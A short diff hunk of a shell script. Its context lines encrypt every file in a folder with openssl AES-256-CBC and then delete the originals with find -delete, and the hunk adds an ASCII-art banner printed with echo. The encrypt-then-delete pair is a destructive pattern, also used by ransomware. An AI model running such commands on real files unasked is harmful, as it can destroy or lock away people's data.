@@ -11,3 +11,13 @@ find "$folder" -type f -not -name ".enc" -exec openssl enc -aes-256-cbc -salt -i
 
 # Delete original files
 find "$folder" -type f -not -name ".enc" -delete
+
+
+echo " (              (       *  "
+echo " )\ )    (      )\ )  (  \`       )"
+echo "(()/(    )\    (()/(  )\))(   ( /("
+echo " /(_))((((_)(   /(_))((_)()\  )\())"
+echo "(_))_  )\ _ )\ (_))  (_()((_)((_)\ "
+echo " |   \ (_)_\(_)| |   |  \/  | / (_)"
+echo " | |) | / _ \  | |__ | |\/| | | |  "
+echo " |___/ /_/ \_\ |____||_|  |_| |_| "
